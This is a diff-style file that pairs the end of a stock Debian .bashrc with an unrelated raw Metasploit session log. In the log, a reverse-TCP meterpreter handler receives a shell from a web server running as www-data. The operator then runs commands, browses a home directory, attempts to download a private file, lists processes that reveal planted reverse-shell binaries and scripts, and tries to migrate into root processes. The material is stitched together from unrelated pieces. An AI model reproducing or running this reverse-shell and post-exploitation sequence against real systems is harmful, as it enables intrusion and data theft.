+    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ "$color_prompt" = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case "$TERM" in
+xterm*|rxvt*)
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    alias ls='ls --color=auto'
+    #alias dir='dir --color=auto'
+    #alias vdir='vdir --color=auto'
+
+    alias grep='grep --color=auto'
+    alias fgrep='fgrep --color=auto'
+    alias egrep='egrep --color=auto'
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
+
+# some more ls aliases
+alias ll='ls -alF'
+alias la='ls -A'
+alias l='ls -CF'
+
+# Add an "alert" alias for long running commands.  Use like so:
+#   sleep 10; alert
+alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+meterpreter > route
+[-] Unknown command: route.
+meterpreter > arp
+[-] Unknown command: arp.
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > shell
+Process 21095 created.
+Channel 8 created.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ q
+/bin/sh: 2: q: not found
+$ ^C
+Terminate channel 8? [y/N]  y
+meterpreter > execute route
+[-] You must specify an executable file with -f
+meterpreter > quit
+[*] Shutting down Meterpreter...
+
+[*] 10.0.3.178 - Meterpreter session 1 closed.  Reason: User exit
+msf exploit(multi/handler) > show info
+
+       Name: Generic Payload Handler
+     Module: exploit/multi/handler
+   Platform: Android, Apple_iOS, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
+       Arch: x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Manual
+
+Provided by:
+  hdm <x@hdm.io>
+  bcook-r7
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Wildcard Target
+
+Payload information:
+  Space: 10000000
+  Avoid: 0 characters
+
+Description:
+  This module is a stub that provides all of the features of the 
+  Metasploit payload system to exploits that have been launched 
+  outside of the framework.
+
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.4      yes       The listen address (an interface may be specified)
+   LPORT  4554             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.0.4:4554 
+[*] Sending stage (53508 bytes) to 10.0.3.178
+[*] Meterpreter session 2 opened (192.168.0.4:4554 -> 10.0.3.178:44522) at 2018-09-07 21:29:32 -0400
+
+meterpreter > getuid
+Server username: www-data
+meterpreter > cd /home/ubuntu
+meterpreter > ls
+Listing: /home/ubuntu
+=====================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  220    fil   2018-08-11 07:57:37 -0400  .bash_logout
+100644/rw-r--r--  3771   fil   2018-08-11 07:57:37 -0400  .bashrc
+100644/rw-r--r--  807    fil   2018-08-11 07:57:37 -0400  .profile
+40700/rwx------   4096   dir   2018-08-27 16:12:38 -0400  .ssh
+100600/rw-------  58891  fil   2018-08-27 16:49:11 -0400  aef91a1137.jpg
+
+meterpreter > tail aef91a1137.jpg
+[-] Unknown command: tail.
+meterpreter > cat aef91a1137.jpg
+[-] core_channel_open: Operation failed: Python exception: PermissionError
+meterpreter > download aef91a1137.jpg
+[*] Downloading: aef91a1137.jpg -> aef91a1137.jpg
+[-] core_channel_open: Operation failed: Python exception: PermissionError
+meterpreter > ps
+
+Process List
+============
+
+ PID    PPID   Name               User             Path
+ ---    ----   ----               ----             ----
+ 1      0      init               root             /sbin/init 
+ 2      0      [kthreadd]         root             
+ 4      2      [kworker/0:0H]     root             
+ 6      2      [mm_percpu_wq]     root             
+ 7      2      [ksoftirqd/0]      root             
+ 8      2      [rcu_sched]        root             
+ 9      2      [rcu_bh]           root             
+ 10     2      [migration/0]      root             
+ 11     2      [watchdog/0]       root             
+ 12     2      [cpuhp/0]          root             
+ 13     2      [kdevtmpfs]        root             
+ 14     2      [netns]            root             
+ 15     2      [rcu_tasks_kthre]  root             
+ 16     2      [kauditd]          root             
+ 17     2      [khungtaskd]       root             
+ 18     2      [oom_reaper]       root             
+ 19     2      [writeback]        root             
+ 20     2      [kcompactd0]       root             
+ 21     2      [ksmd]             root             
+ 22     2      [khugepaged]       root             
+ 23     2      [crypto]           root             
+ 24     2      [kintegrityd]      root             
+ 25     2      [kblockd]          root             
+ 26     2      [ata_sff]          root             
+ 27     2      [md]               root             
+ 28     2      [edac-poller]      root             
+ 29     2      [devfreq_wq]       root             
+ 30     2      [watchdogd]        root             
+ 34     2      [kswapd0]          root             
+ 35     2      [ecryptfs-kthrea]  root             
+ 77     2      [kthrotld]         root             
+ 78     2      [acpi_thermal_pm]  root             
+ 79     2      [scsi_eh_0]        root             
+ 80     2      [scsi_tmf_0]       root             
+ 86     2      [ipv6_addrconf]    root             
+ 93     2      [kworker/0:1H]     root             
+ 97     2      [kstrp]            root             
+ 114    2      [charger_manager]  root             
+ 279    2      [raid5wq]          root             
+ 330    2      [jbd2/sda1-8]      root             
+ 331    2      [ext4-rsv-conver]  root             
+ 397    2      [iscsi_eh]         root             
+ 403    1      systemd-journald   root             /lib/systemd/systemd-journald 
+ 407    2      [ib-comp-wq]       root             
+ 408    2      [ib_mcast]         root             
+ 409    2      [ib_nl_sa_wq]      root             
+ 410    2      [rdma_cm]          root             
+ 425    1      lvmetad            root             /sbin/lvmetad -f 
+ 426    1      systemd-udevd      root             /lib/systemd/systemd-udevd 
+ 537    2      [loop0]            root             
+ 541    2      [loop2]            root             
+ 564    1      auditd             root             /sbin/auditd 
+ 699    1      systemd-networkd   systemd-network  /lib/systemd/systemd-networkd 
+ 729    1      systemd-resolved   systemd-resolve  /lib/systemd/systemd-resolved 
+ 862    1      iscsid             root             /sbin/iscsid 
+ 863    1      iscsid             root             /sbin/iscsid 
+ 883    1      dbus-daemon        messagebus       /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+ 905    1      atd                root             /usr/sbin/atd -f 
+ 916    1      accounts-daemon    root             /usr/lib/accountsservice/accounts-daemon 
+ 919    1      cron               root             /usr/sbin/cron -f 
+ 948    1      python3            root             /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
+ 953    1      rsyslogd           syslog           /usr/sbin/rsyslogd -n 
+ 955    1      systemd-logind     root             /lib/systemd/systemd-logind 
+ 956    1      lxcfs              root             /usr/bin/lxcfs /var/lib/lxcfs/ 
+ 961    1      chronyd            _chrony          /usr/sbin/chronyd 
+ 991    1      polkitd            root             /usr/lib/policykit-1/polkitd --no-debug 
+ 992    1      agetty             root             /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
+ 1004   1      agetty             root             /sbin/agetty -o -p -- \u --noclear tty1 linux 
+ 1071   1      apache2            root             /usr/sbin/apache2 -k start 
+ 1073   1      mysqld             mysql            /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid 
+ 1138   1      python3            root             /usr/bin/python3 /usr/bin/google_network_daemon 
+ 1139   1      python3            root             /usr/bin/python3 /usr/bin/google_clock_skew_daemon 
+ 1162   1      python3            root             /usr/bin/python3 /usr/bin/google_accounts_daemon 
+ 1180   1      sshd               root             /usr/sbin/sshd -D 
+ 11461  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 11613  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 11918  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 11928  11918  sh                 www-data         sh -c python -c 'import pty;pty.spawn("/bin/bash");' 2>&1
+ 
+ 11929  11928  python             www-data         python -c import pty;pty.spawn("/bin/bash"); 
+ 11932  11929  bash               www-data         /bin/bash 
+ 12141  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 12211  12141  sh                 www-data         sh -c python /tmp/asdf.py 2>&1
+ 
+ 12212  12211  python             www-data         python /tmp/asdf.py 
+ 12213  12212  bash               www-data         /bin/bash 
+ 12215  11613  sh                 www-data         sh -c python /tmp/asdf.py 2>&1
+ 
+ 12216  12215  python             www-data         python /tmp/asdf.py 
+ 12229  12216  bash               www-data         /bin/bash 
+ 12232  11461  sh                 www-data         sh -c python /tmp/asdf.py 2>&1
+ 
+ 12233  12232  python             www-data         python /tmp/asdf.py 
+ 12234  12233  bash               www-data         /bin/bash 
+ 12423  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 12464  12423  sh                 www-data         sh -c ping 192.168.0.4 2>&1
+ 
+ 12465  12464  ping               www-data         ping 192.168.0.4 
+ 12472  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 12474  12472  sh                 www-data         sh -c ping 192.168.0.4 > /tmp/pingout.txt 2>&1
+ 
+ 12475  12474  ping               www-data         ping 192.168.0.4 
+ 13826  2      [loop3]            root             
+ 15313  2      [loop5]            root             
+ 25797  1180   sshd:              root             sshd: printer_25132 [priv]
+ 25799  1      systemd            printer_25132    /lib/systemd/systemd --user 
+ 25800  25799  (sd-pam)           printer_25132    (sd-pam) 
+ 25921  25797  sshd:              printer_25132    sshd: printer_25132@pts/0
+ 25922  25921  -bash              printer_25132    -bash 
+ 25936  25922  sudo               root             sudo su 
+ 25937  25936  su                 root             su 
+ 25938  25937  bash               root             bash 
+ 25974  25938  bash               root             bash 
+ 26021  25974  rev_tcp_x64        root             ./rev_tcp_x64 
+ 26391  2      [kworker/0:0]      root             
+ 26490  2      [loop4]            root             
+ 26523  1      snapd              root             /usr/lib/snapd/snapd 
+ 30416  2      [kworker/0:1]      root             
+ 31380  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31444  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31451  2      [kworker/u2:2]     root             
+ 31472  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31487  2      [kworker/u2:0]     root             
+ 31493  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31500  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31507  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31508  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31510  2      [kworker/0:2]      root             
+ 31518  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31528  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31529  31472  [sh]               www-data         
+ 31542  1      python             www-data         python ne0.py 
+ 31546  2      [kworker/u2:1]     root             
+ 31613  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31619  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > migrate -h
+Usage: migrate <<pid> | -P <pid> | -N <name>> [-p writable_path] [-t timeout]
+
+Migrates the server instance to another process.
+NOTE: Any open channels or other dynamic state will be lost.
+
+meterpreter > migrate 1071
+[-] Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
+meterpreter > migrate -P 1071
+[-] Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > ps
+
+Process List
+============
+
+ PID    PPID   Name               User             Path
+ ---    ----   ----               ----             ----
+ 1      0      init               root             /sbin/init 
+ 2      0      [kthreadd]         root             
+ 4      2      [kworker/0:0H]     root             
+ 6      2      [mm_percpu_wq]     root             
+ 7      2      [ksoftirqd/0]      root             
+ 8      2      [rcu_sched]        root             
+ 9      2      [rcu_bh]           root             
+ 10     2      [migration/0]      root             
+ 11     2      [watchdog/0]       root             
+ 12     2      [cpuhp/0]          root             
+ 13     2      [kdevtmpfs]        root             
+ 14     2      [netns]            root             
+ 15     2      [rcu_tasks_kthre]  root             
+ 16     2      [kauditd]          root             
+ 17     2      [khungtaskd]       root             
+ 18     2      [oom_reaper]       root             
+ 19     2      [writeback]        root             
+ 20     2      [kcompactd0]       root             
+ 21     2      [ksmd]             root             
+ 22     2      [khugepaged]       root             
+ 23     2      [crypto]           root             
+ 24     2      [kintegrityd]      root             
+ 25     2      [kblockd]          root             
+ 26     2      [ata_sff]          root             
+ 27     2      [md]               root             
+ 28     2      [edac-poller]      root             
+ 29     2      [devfreq_wq]       root             
+ 30     2      [watchdogd]        root             
+ 34     2      [kswapd0]          root             
+ 35     2      [ecryptfs-kthrea]  root             
+ 77     2      [kthrotld]         root             
+ 78     2      [acpi_thermal_pm]  root             
+ 79     2      [scsi_eh_0]        root             
+ 80     2      [scsi_tmf_0]       root             
+ 86     2      [ipv6_addrconf]    root             
+ 93     2      [kworker/0:1H]     root             
+ 97     2      [kstrp]            root             
+ 114    2      [charger_manager]  root             
+ 279    2      [raid5wq]          root             
+ 330    2      [jbd2/sda1-8]      root             
+ 331    2      [ext4-rsv-conver]  root             
+ 397    2      [iscsi_eh]         root             
+ 403    1      systemd-journald   root             /lib/systemd/systemd-journald 
+ 407    2      [ib-comp-wq]       root             
+ 408    2      [ib_mcast]         root             
+ 409    2      [ib_nl_sa_wq]      root             
+ 410    2      [rdma_cm]          root             
+ 425    1      lvmetad            root             /sbin/lvmetad -f 
+ 426    1      systemd-udevd      root             /lib/systemd/systemd-udevd 
+ 537    2      [loop0]            root             
+ 541    2      [loop2]            root             
+ 564    1      auditd             root             /sbin/auditd 
+ 699    1      systemd-networkd   systemd-network  /lib/systemd/systemd-networkd 
+ 729    1      systemd-resolved   systemd-resolve  /lib/systemd/systemd-resolved 
+ 862    1      iscsid             root             /sbin/iscsid 
+ 863    1      iscsid             root             /sbin/iscsid 
+ 883    1      dbus-daemon        messagebus       /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+ 905    1      atd                root             /usr/sbin/atd -f 
+ 916    1      accounts-daemon    root             /usr/lib/accountsservice/accounts-daemon 
+ 919    1      cron               root             /usr/sbin/cron -f 
+ 948    1      python3            root             /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
+ 953    1      rsyslogd           syslog           /usr/sbin/rsyslogd -n 
+ 955    1      systemd-logind     root             /lib/systemd/systemd-logind 
+ 956    1      lxcfs              root             /usr/bin/lxcfs /var/lib/lxcfs/ 
+ 961    1      chronyd            _chrony          /usr/sbin/chronyd 
+ 991    1      polkitd            root             /usr/lib/policykit-1/polkitd --no-debug 
+ 992    1      agetty             root             /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
+ 1004   1      agetty             root             /sbin/agetty -o -p -- \u --noclear tty1 linux 
+ 1071   1      apache2            root             /usr/sbin/apache2 -k start 
+ 1073   1      mysqld             mysql            /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid 
+ 1138   1      python3            root             /usr/bin/python3 /usr/bin/google_network_daemon 
+ 1139   1      python3            root             /usr/bin/python3 /usr/bin/google_clock_skew_daemon 
+ 1162   1      python3            root             /usr/bin/python3 /usr/bin/google_accounts_daemon 
+ 1180   1      sshd               root             /usr/sbin/sshd -D 
+ 11461  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 11613  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 11918  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 11928  11918  sh                 www-data         sh -c python -c 'import pty;pty.spawn("/bin/bash");' 2>&1
+ 
+ 11929  11928  python             www-data         python -c import pty;pty.spawn("/bin/bash"); 
+ 11932  11929  bash               www-data         /bin/bash 
+ 12141  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 12211  12141  sh                 www-data         sh -c python /tmp/asdf.py 2>&1
+ 
+ 12212  12211  python             www-data         python /tmp/asdf.py 
+ 12213  12212  bash               www-data         /bin/bash 
+ 12215  11613  sh                 www-data         sh -c python /tmp/asdf.py 2>&1
+ 
+ 12216  12215  python             www-data         python /tmp/asdf.py 
+ 12229  12216  bash               www-data         /bin/bash 
+ 12232  11461  sh                 www-data         sh -c python /tmp/asdf.py 2>&1
+ 
+ 12233  12232  python             www-data         python /tmp/asdf.py 
+ 12234  12233  bash               www-data         /bin/bash 
+ 12423  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 12464  12423  sh                 www-data         sh -c ping 192.168.0.4 2>&1
+ 
+ 12465  12464  ping               www-data         ping 192.168.0.4 
+ 12472  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 12474  12472  sh                 www-data         sh -c ping 192.168.0.4 > /tmp/pingout.txt 2>&1
+ 
+ 12475  12474  ping               www-data         ping 192.168.0.4 
+ 13826  2      [loop3]            root             
+ 15313  2      [loop5]            root             
+ 25797  1180   sshd:              root             sshd: printer_25132 [priv]
+ 25799  1      systemd            printer_25132    /lib/systemd/systemd --user 
+ 25800  25799  (sd-pam)           printer_25132    (sd-pam) 
+ 25921  25797  sshd:              printer_25132    sshd: printer_25132@pts/0
+ 25922  25921  -bash              printer_25132    -bash 
+ 25936  25922  sudo               root             sudo su 
+ 25937  25936  su                 root             su 
+ 25938  25937  bash               root             bash 
+ 25974  25938  bash               root             bash 
+ 26021  25974  rev_tcp_x64        root             ./rev_tcp_x64 
+ 26391  2      [kworker/0:0]      root             
+ 26490  2      [loop4]            root             
+ 26523  1      snapd              root             /usr/lib/snapd/snapd 
+ 31380  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31472  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31487  2      [kworker/u2:0]     root             
+ 31493  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31500  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31508  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31510  2      [kworker/0:2]      root             
+ 31518  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31528  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31529  31472  [sh]               www-data         
+ 31542  1      python             www-data         python ne0.py 
+ 31546  2      [kworker/u2:1]     root             
+ 31619  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31626  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31633  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+ 31640  1071   apache2            www-data         /usr/sbin/apache2 -k start 
+
+meterpreter > migrate 919
+[-] Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
+meterpreter >
